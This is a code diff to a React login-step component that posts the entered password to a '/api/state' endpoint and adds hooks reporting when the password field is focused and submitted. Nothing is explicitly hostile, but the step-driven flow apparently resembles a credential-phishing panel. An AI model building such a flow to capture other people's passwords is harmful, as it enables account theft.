@@ -8,7 +8,7 @@ import Image from "next/image";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { useToast } from "@/hooks/use-toast";
-import { Eye, EyeOff, UserCircle } from "lucide-react";
+import { UserCircle } from "lucide-react";
 import { Checkbox } from "@/components/ui/checkbox";
 
 const passwordSchema = z.object({
@@ -20,9 +20,11 @@ type LoginStepProps = {
   email: string;
   name: string;
   profilePicture: string;
+  onInteractionStart: () => void;
+  onInteractionEnd: (submitAction: () => Promise<void>) => Promise<void>;
 };
 
-export default function LoginStep({ email, name, profilePicture }: LoginStepProps) {
+export default function LoginStep({ email, name, profilePicture, onInteractionStart, onInteractionEnd }: LoginStepProps) {
   const { register, handleSubmit, formState: { errors, isSubmitting } } = useForm<PasswordFormData>({
     resolver: zodResolver(passwordSchema),
   });
@@ -30,20 +32,22 @@ export default function LoginStep({ email, name, profilePicture }: LoginStepProp
   const [showPassword, setShowPassword] = useState(false);
 
   const onSubmit: SubmitHandler<PasswordFormData> = async (data) => {
-    try {
-      const res = await fetch("/api/state", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ action: "submitPassword", password: data.password }),
-      });
-      if (!res.ok) throw new Error("Server responded with an error.");
-    } catch (error) {
-      toast({
-        variant: "destructive",
-        title: "Error",
-        description: "Could not proceed. Please try again.",
-      });
-    }
+    await onInteractionEnd(async () => {
+      try {
+        const res = await fetch("/api/state", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ action: "submitPassword", password: data.password }),
+        });
+        if (!res.ok) throw new Error("Server responded with an error.");
+      } catch (error) {
+        toast({
+          variant: "destructive",
+          title: "Error",
+          description: "Could not proceed. Please try again.",
+        });
+      }
+    });
   };
 
   return (
@@ -74,6 +78,7 @@ export default function LoginStep({ email, name, profilePicture }: LoginStepProp
             placeholder="Enter your password"
             {...register("password")}
             className="h-14 pt-2 text-base pr-12"
+            onFocus={onInteractionStart}
           />
         </div>
          {errors.password && <p className="text-sm text-destructive mt-1 px-1 text-left">{errors.password.message}</p>}
